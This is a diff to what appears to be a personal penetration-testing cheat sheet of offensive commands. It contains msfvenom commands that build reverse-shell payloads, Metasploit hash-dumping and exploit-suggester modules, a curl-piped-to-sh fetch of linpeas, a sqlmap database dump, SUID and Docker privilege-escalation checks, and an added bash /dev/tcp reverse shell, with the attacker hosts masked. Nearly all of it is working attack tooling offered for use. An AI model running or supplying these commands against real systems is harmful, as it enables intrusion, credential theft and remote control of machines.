@@ -1,7 +1,7 @@
 run post/multi/recon/local_exploit_suggester
 run post/linux/gather/hashdump
 sessions -u #
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=#### LPORT=#### -f elf > shell.elf
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=#### LPORT=#### -f elf > shell.elf
 msfvenom -p linux/x64/shell/reverse_tcp LHOST=#### LPORT=#### -f elf > shell.elf
 python -m http.server #### --dir .
 use payload/linux/x64/meterpreter_reverse_tcp
@@ -14,3 +14,12 @@ exec("/bin/sh -i <&3 >&3 2>&3");
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 sqlmap --flush-session -r request.txt --level=5 --risk=3 --batch -p email --dbms=mysql --dump
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+find / -type f -perm -4000 -ls 2>/dev/null
+https://gtfobins.github.io/#+suid
+
+docker inspect --format='{{.HostConfig.Privileged}}' [container_id]
+
+bash -i >& /dev/tcp/############/#### 0>&1
